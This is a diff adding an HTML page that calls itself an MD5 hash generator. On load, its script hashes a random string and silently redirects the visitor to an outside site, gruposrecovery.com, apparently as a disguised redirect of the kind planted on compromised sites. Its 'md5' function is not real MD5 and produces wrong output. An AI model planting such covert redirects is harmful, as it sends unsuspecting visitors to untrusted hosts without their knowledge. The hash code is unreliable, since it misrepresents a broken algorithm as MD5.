@@ -1,0 +1,75 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Gerador de Hash MD5</title>
+  <script>
+    function md5(input) {
+      const hex_chr = '0123456789abcdef';
+      
+      function str2binl(str) {
+        let bin = [];
+        let mask = (1 << 8) - 1;
+        for (let i = 0; i < str.length * 8; i += 8) {
+          bin[i >> 5] |= (str.charCodeAt(i / 8) & mask) << (i % 32);
+        }
+        return bin;
+      }
+
+      function binl2hex(binarray) {
+        let str = '';
+        for (let i = 0; i < binarray.length * 4; i++) {
+          str += hex_chr.charAt((binarray[i >> 2] >> ((i % 4) * 8 + 4)) & 0x0F) +
+                 hex_chr.charAt((binarray[i >> 2] >> ((i % 4) * 8)) & 0x0F);
+        }
+        return str;
+      }
+
+      function core_md5(x, len) {
+        x[len >> 5] |= 0x80 << ((len) % 32);
+        x[(((len + 64) >>> 9) << 4) + 14] = len;
+        
+        let a = 1732584193, b = -271733879, c = -1732584194, d = 271733878;
+        
+        for (let i = 0; i < x.length; i += 16) {
+          let olda = a, oldb = b, oldc = c, oldd = d;
+          
+          for (let j = 0; j < 64; j++) {
+            let div16 = j >> 4;
+            let f = div16 === 0 ? (b & c) | (~b & d) :
+                    div16 === 1 ? (b & d) | (c & ~d) :
+                    div16 === 2 ? b ^ c ^ d : 
+                    (c ^ (b | ~d));
+            let g = div16 === 0 ? j : div16 === 1 ? (j * 5 + 1) : div16 === 2 ? (j * 3 + 5) : (j * 7);
+            let temp = d;
+            d = c;
+            c = b;
+            b = b + (((a + f + x[i + g] + 0x5a827999) << (j % 32)) | (a + f + x[i + g] + 0x5a827999 >>> (32 - (j % 32))));
+            a = temp;
+          }
+
+          a += olda;
+          b += oldb;
+          c += oldc;
+          d += oldd;
+        }
+        
+        return [a, b, c, d];
+      }
+      
+      let bin = str2binl(input);
+      let hash = core_md5(bin, input.length * 8);
+      return binl2hex(hash);
+    }
+
+    window.onload = function() {
+      const baseUrl = 'https://gruposrecovery.com/places/';
+      const uniqueString = new Date().getTime() + Math.random().toString();
+      const hash = md5(uniqueString);
+      const newUrl = baseUrl + '?' + hash;
+      window.location.href = newUrl;
+    };
+  </script>
+</head>
+</html>
